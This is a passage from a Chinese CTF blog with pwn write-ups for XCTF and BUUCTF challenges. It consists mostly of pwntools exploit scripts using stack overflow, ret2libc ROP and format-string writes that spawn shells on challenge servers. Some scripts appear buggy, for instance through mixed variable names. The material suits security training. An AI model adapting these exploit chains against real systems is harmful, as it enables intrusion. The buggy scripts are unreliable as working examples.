class="number">0x08048320</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(system)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line"></span><br><span class="line">a.send(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><p>这道题就做完了，嘻嘻嘻~😀</p><blockquote><p>因博主近期忙于学习，下面的题解就不写过程了，若有问题，可以留言或者联系我，敬请谅解(●’◡’●)</p></blockquote><h1 id="level0"><a class="markdownIt-Anchor" href="#level0"></a> level0</h1><p><em><strong>栈溢出</strong></em></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">55157</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="when_did_you_born"><a class="markdownIt-Anchor" href="#when_did_you_born"></a> when_did_you_born</h1><p><em><strong>栈溢出</strong></em></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">"111.198.29.45"</span>,<span class="string">"44063"</span>)</span><br><span class="line"></span><br><span class="line">system_catflag = <span class="number">0x400906</span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"?"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">"1925"</span>)  </span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Name?"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">'a'</span> + p32(<span class="number">0x00000786</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="cgpwn2"><a class="markdownIt-Anchor" href="#cgpwn2"></a> cgpwn2</h1><p><em><strong>栈溢出</strong></em></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">46997</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x08048420</span></span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x2A</span>*<span class="string">'a'</span> + p32(sys_addr) + p32(<span class="number">0</span>) + p32(name_addr)</span><br><span class="line"></span><br><span class="line">sys_format = <span class="string">"cat flag"</span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'please tell me your name\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(sys_format)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'hello,you can leave some message here:\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="int_overflow"><a class="markdownIt-Anchor" href="#int_overflow"></a> int_overflow</h1><p><em><strong>栈溢出</strong></em></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">41481</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">24</span> + p32(<span class="number">0x0804868B</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">263</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="cgfsb"><a class="markdownIt-Anchor" href="#cgfsb"></a> CGfsb</h1><p><em><strong>字符串格式化</strong></em></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">50292</span>)</span><br><span class="line"></span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line"> </span><br><span class="line">payload1 = <span class="string">'aaaa'</span></span><br><span class="line"></span><br><span class="line">payload2 = p32(pwnme) + <span class="string">'aaaa%10$n'</span></span><br><span class="line"> </span><br><span class="line">a.recvuntil(<span class="string">'please tell me your name:\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload1)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'leave your message please:\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload2)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="level3"><a class="markdownIt-Anchor" href="#level3"></a> level3</h1><p><em><strong>栈溢出  ROP</strong></em></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'124.126.19.106'</span>,<span class="number">40796</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">a.sendlineafter(<span class="string">'Input:\n'</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(a.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_addr) + <span class="string">'9527'</span> + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
            <tag> Pwn </tag>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF—WP</title>
      <link href="/posts/buuctf-wp/"/>
      <url>/posts/buuctf-wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>上一篇写的是XCTF的wp，那这篇博客，就记录一些在BUUCTF刷题的wp；</p><a id="more"></a><h1 id="rip"><a class="markdownIt-Anchor" href="#rip"></a> rip</h1><p>这道题拿过来，还是先看保护机制：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/rip_1.png" alt="rip_1"></p><p>这、这、这个什么保护都没开😂，看样子不难，丢进ida查看伪代码：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/rip_2.png" alt="rip_2"></p><p>这个意思就是，先读取一个字符串，然后输出这个字符串，然后就没有啦；</p><p>再看有个fun()函数，点进去：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/rip_3.png" alt="rip_3"></p><p>这里可以看出，如果控制gets函数，使得输入的字符串，覆盖到fun()函数即可获取shell，这里fun()函数的地址也给了出来，直接利用；</p><p>用它之前还得计算偏移量：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/rip_4.png" alt="rip_4"></p><p>偏移量 = （0xF + 0x8）= 0x17</p><p>这样就可以了，上exp：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26706</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">23</span>+p64(<span class="number">0x401186</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>nice~~  （￣︶￣）↗</p><blockquote><p>到这里，一个简单题解，因作者最近忙于功课，下面的题目只写了exp，如有疑问，给我留言或者联系我</p></blockquote><blockquote><p>栈溢出中重要又难的点叫做ROP，下面重点整理这类题目</p></blockquote><h1 id="bjdctf_2020_babyrop"><a class="markdownIt-Anchor" href="#bjdctf_2020_babyrop"></a> bjdctf_2020_babyrop</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25467</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./bjdctf_2020_babyrop'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x4006ad</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Pull up your sword and tell me u story!\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi_addr)+p64(binsh_addr)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Pull up your sword and tell me u story!\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="bjdctf_2020_babyrop2"><a class="markdownIt-Anchor" href="#bjdctf_2020_babyrop2"></a> bjdctf_2020_babyrop2</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29718</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./bjdctf_2020_babyrop2'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400993</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4008da</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x400887</span></span><br><span class="line"></span><br><span class="line">canary = <span class="string">'%7$p'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%7$p'</span>+<span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"I'll give u some gift to help u!\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%7$p'</span>+<span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi)+p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"I'll give u some gift to help u!\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="ogeek2019babyrop"><a class="markdownIt-Anchor" href="#ogeek2019babyrop"></a> [OGeek2019]babyrop</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28485</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./OGeek2019babyrop'</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">read_plt=elf.plt[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'\x00'</span>+<span class="string">'\xff'</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0xe7</span>+<span class="string">'b'</span>*<span class="number">0x4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">'read'</span>)</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xe7</span>+<span class="string">'b'</span>*<span class="number">0x4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="ciscn_2019_en_2"><a class="markdownIt-Anchor" href="#ciscn_2019_en_2"></a> ciscn_2019_en_2</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29319</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./ciscn_2019_en_2'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x400b28</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Input your choice!'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Input your Plaintext to be encrypted'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'@'</span>)</span><br><span class="line"></span><br><span class="line">a.recv(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr= u64(a.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">"puts"</span>,puts_addr )</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x58</span>+p64(<span class="number">0x4006b9</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Input your choice!'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Input your Plaintext to be encrypted'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="jarvisoj_level3_x64"><a class="markdownIt-Anchor" href="#jarvisoj_level3_x64"></a> jarvisoj_level3_x64</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26789</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x40061a</span> </span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x04006b3</span></span><br><span 